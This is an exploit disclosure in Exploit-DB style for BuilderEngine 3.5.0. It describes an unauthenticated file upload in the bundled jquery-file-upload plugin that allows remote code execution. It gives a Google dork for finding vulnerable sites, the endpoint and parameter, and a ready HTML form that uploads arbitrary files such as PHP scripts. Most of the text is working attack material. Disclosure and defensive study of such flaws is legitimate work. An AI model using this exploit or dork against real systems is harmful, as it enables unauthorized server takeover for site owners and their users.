<!-- 
# Exploit Title: BuilderEngine 3.5.0 Remote Code Execution via elFinder 2.0
# Date: 18/09/2016
# Exploit Author: metanubix
# Vendor Homepage: http://builderengine.org/
# Software Link: http://builderengine.org/page-cms-download.html
# Version: 3.5.0
# Tested on: Kali Linux 2.0 64 bit
# Google Dork: intext:"BuilderEngine Ltd. All Right Reserved"

1) Unauthenticated Unrestricted File Upload:

	POST /themes/dashboard/assets/plugins/jquery-file-upload/server/php/

	Vulnerable Parameter: files[]

	We can upload test.php and reach the file via the following link:
	/files/test.php
-->
<html>
<body>
<form method="post" action="http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data">
	<input type="file" name="files[]" />
	<input type="submit" value="send" />
</form>
</body>
</html>

